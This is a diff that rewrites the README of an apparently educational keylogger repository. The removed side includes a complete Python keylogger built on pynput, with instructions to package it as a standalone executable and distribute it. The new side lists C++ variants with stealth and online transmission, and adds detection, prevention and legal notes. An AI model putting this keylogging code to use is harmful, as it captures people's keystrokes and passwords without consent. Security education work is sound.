@@ -1,62 +1,92 @@
-# Keylog Project Documentation
+# Keylogger Implementations
 
-## Overview
-The Keylog project implements a keylogger, which is software that records keystrokes on a computer. This document provides detailed technical information about the project, including code examples, detection methods, and usage.
+This repository contains four different implementations of a keylogger for educational purposes.
 
-## Technical Details
-- **Language**: Python
-- **Platform**: Cross-platform
-- **Dependencies**:  
-  - `pynput` - for keylogging
-  - `pyinstaller` - for packaging into executables
+## Implementations
 
-## Complete Code Example
-Below is a simple implementation of a keylogger using the `pynput` library.
+1. **keylog.cpp**: Basic keylogging functionality.
+2. **keylog_advanced.cpp**: Advanced features including stealth mode.
+3. **keylog_online.cpp**: Keylogger that transmits data over the internet.
+4. **keylog_hook.cpp**: Uses Windows hooks to capture keystrokes.
 
-```python
-import logging
-from pynput import keyboard
+## Build Instructions
 
-# Configure logging to record keystrokes
-logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
+### Manual Compilation
+To compile the keylogger from the source code:
+1. Use your preferred C++ compiler (e.g., g++).
+2. Run the following command:
+   ```
+   g++ keylog.cpp -o keylog
+   ```
 
-def on_press(key):
-    try:
-        logging.info(f'Key {key.char} pressed')
-    except AttributeError:
-        logging.info(f'Special key {key} pressed')
+### Using Makefile
+To build using a Makefile:
+1. Execute:
+   ```
+   make
+   ```
 
-# Collect events until released
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+### Using CMake
+To build using CMake:
+1. Create a build directory:
+   ```
+   mkdir build && cd build
+   ```
+2. Run CMake:
+   ```
+   cmake ..
+   make
+   ```
+
+## Technical Architecture
+
+```
+[User Input]
+   |
+   |--- [Capture Keystrokes]
+   |
+   |--- [Process Data]
+   |
+   |--- [Store/Transmit Data]
 ```
 
-## Online Implementation
-For online implementations, consider using services like PythonAnywhere or Heroku that can host your Python scripts. Simply upload your script and schedule it to run as per your requirements.
-
-## Offline Implementation
-For offline implementations:
-1. Install the required dependencies:
-   ```bash
-   pip install pynput pyinstaller
-   ```
-2. Run your script locally to start logging keystrokes.
-3. Use `pyinstaller` to create a standalone executable:
-   ```bash
-   pyinstaller --onefile keylogger.py
-   ```
-4. Distribute the executable as needed.
-
 ## Detection Methods
-There are various methods to detect keyloggers:
-- **Behavioral detection**: Monitoring suspicious activity on the system, such as unexpected logs or resource usage.
-- **Signature-based detection**: Using known patterns to find keylogger code snippets in applications. 
-- **Heuristic analysis**: Checking applications for typical functions and behaviors associated with keyloggers.
 
-## Educational Content
-To further understand how keyloggers operate, consider studying:
-- Low-level keyboard input handling in operating systems.
-- Ethical considerations and legal implications of keystroke logging.
+### YARA Rules
+Create YARA rules to detect known keylogger signatures.
 
-## Disclaimer
-This keylogger is for educational purposes only. Ensure you have permission to record keystrokes on any device before deploying such software.
+### PowerShell Scripts
+Use the following PowerShell script to detect keylogger processes:
+```powershell
+Get-Process | Where-Object { $_.ProcessName -like "*keylog*" }
+```
+
+## Prevention Techniques
+
+1. **For Users**:
+   - Regularly update antivirus software.
+   - Avoid downloading untrusted sources.
+
+2. **For Administrators**:
+   - Monitor system logs.
+   - Implement strict access controls.
+
+## Educational Use Cases
+
+- Understanding keylogging techniques for cybersecurity training.
+- Developing secure software by recognizing potential threats.
+
+## Legal and Ethical Guidelines
+
+Keyloggers can be used maliciously, and in many jurisdictions, their use is governed by laws such as:
+- **CFAA (Computer Fraud and Abuse Act)**
+- **GDPR** (General Data Protection Regulation)
+- **Computer Misuse Act**
+
+Always ensure compliance with local laws when using keyloggers.
+
+## References
+
+1. [CFAA Overview](https://www.law.cornell.edu/wex/computer_fraud_and_abuse_act)
+2. [GDPR Guidelines](https://gdpr-info.eu/)
+3. [Computer Misuse Act](https://www.legislation.gov.uk/ukpga/1990/18/contents)
